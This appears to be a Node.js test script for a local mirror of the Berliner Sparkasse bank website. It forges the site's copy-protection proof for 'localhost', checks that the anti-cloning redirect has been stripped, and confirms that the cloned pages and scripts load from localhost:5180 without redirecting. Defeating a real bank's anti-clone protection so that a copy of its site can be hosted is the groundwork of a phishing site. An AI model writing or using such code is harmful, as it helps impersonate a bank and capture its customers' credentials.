import { fixCopyProtection, computeCpProof } from '../lib/copy-protection.mjs';

const r = await fetch('https://www.berliner-sparkasse.de/de/home.html?n=true&stref=logo', {
  headers: { 'User-Agent': 'Mozilla/5.0' },
});
const html = await r.text();
const salt = html.match(/data-cp_salt="([^"]+)"/)?.[1];
const fixed = fixCopyProtection(html, 'localhost');
const proof = fixed.match(/data-cp_proof="([^"]+)"/)?.[1];
console.log('localhost proof', proof);
console.log('expected', computeCpProof('localhost', salt));
console.log('match', proof === computeCpProof('localhost', salt));
console.log('redirect removed', !fixed.includes('data-cp_redirect'));

const t0 = Date.now();
const r2 = await fetch('http://localhost:5180/de/home.html?n=true&stref=logo');
const html2 = await r2.text();
console.log('mirror status', r2.status, 'ms', Date.now() - t0);
const proof2 = html2.match(/data-cp_proof="([^"]+)"/)?.[1];
console.log('mirror proof', proof2, 'match localhost', proof2 === computeCpProof('localhost', salt));
console.log('has cp-block', html2.includes('bsk-cp-block'));

const t1 = Date.now();
const r3 = await fetch('http://localhost:5180/etc/clientlibs/myif/master/base/internetfiliale.min.6629fb8d5c51445ddec676ca7efb59d2.js');
console.log('js status', r3.status, 'size', (await r3.arrayBuffer()).byteLength, 'ms', Date.now() - t1);

const pages = [
  '/de/home/privatkunden/girokonto.html',
  '/de/home/service.html',
  '/fi/home.html',
  '/en/home.html',
];
for (const p of pages) {
  const pr = await fetch('http://localhost:5180' + p, { redirect: 'manual' });
  console.log(p, pr.status, pr.headers.get('location') || 'ok');
}
